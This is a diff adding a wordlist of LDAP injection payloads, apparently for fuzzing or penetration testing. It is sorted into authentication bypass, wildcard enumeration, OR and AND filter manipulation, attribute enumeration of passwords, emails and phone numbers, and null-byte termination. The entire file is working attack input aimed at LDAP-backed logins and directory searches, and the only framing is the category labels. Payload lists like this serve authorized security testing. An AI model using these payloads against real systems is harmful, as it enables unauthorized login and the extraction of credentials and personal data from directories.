@@ -1,0 +1,29 @@
+# Auth bypass
+*)(uid=*))(|(uid=*
+*)(&
+*)(|(password=*
+admin)(&)
+admin)(|(objectClass=*
+*)(%26
+
+# Wildcard enumeration
+*
+a*
+**
+
+# Filter manipulation - OR injection
+)(uid=*
+)(|(cn=*
+))(|(uid=*))(|(uid=*
+
+# Filter manipulation - AND injection
+)(!(objectClass=*
+*)(objectClass=*
+
+# Attribute enumeration
+admin)(|(userPassword=a*
+*)(mail=*
+*)(telephoneNumber=*
+
+# Null-byte termination
+admin)%00
